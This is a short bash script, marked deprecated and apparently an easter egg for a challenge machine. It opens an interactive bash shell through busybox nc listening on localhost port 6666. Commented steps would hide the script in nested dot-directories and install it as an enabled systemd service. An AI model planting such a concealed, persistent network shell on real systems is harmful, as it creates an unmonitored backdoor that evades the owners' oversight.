# 废弃

#!/bin/bash

echo "恭喜你找到彩蛋!!!" > $FIFO &
/bin/bash -i < $FIFO 2>&1 | /usr/bin/busybox nc -lvp 6666 -s 127.0.0.1 > $FIFO

# 配置问题
# mkdir -p /opt/.secret/.verysecret/
# mv egg.sh /opt/.secret/.verysecret/.egg.sh
# mv egg.service /etc/systemd/system/
# chmod +x /opt/.secret/.verysecret/.egg.sh
# systemctl daemon-reload
# systemctl start egg.service
# systemctl enable egg.service